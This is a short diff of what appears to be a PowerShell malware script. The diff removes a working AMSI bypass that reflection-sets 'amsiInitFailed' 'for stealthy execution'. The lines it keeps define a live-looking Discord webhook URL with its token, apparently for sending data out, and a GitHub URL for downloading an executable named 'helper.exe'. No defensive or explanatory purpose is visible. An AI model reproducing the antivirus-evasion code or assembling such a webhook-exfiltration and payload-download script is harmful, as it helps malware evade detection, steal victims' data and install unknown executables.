@@ -1,7 +1,3 @@
-# AMSI Bypass for stealthy execution
-try {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-} catch { }
 
 $WebhookURL = "https://discord.com/api/webhooks/1442924485698392219/Vz4aoPFbx2IaVvT0SRJt5I2IKGd_RXg-fDgy69gkUVdKDvRSkFL_nPE0sRB_E3QTEUxD"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
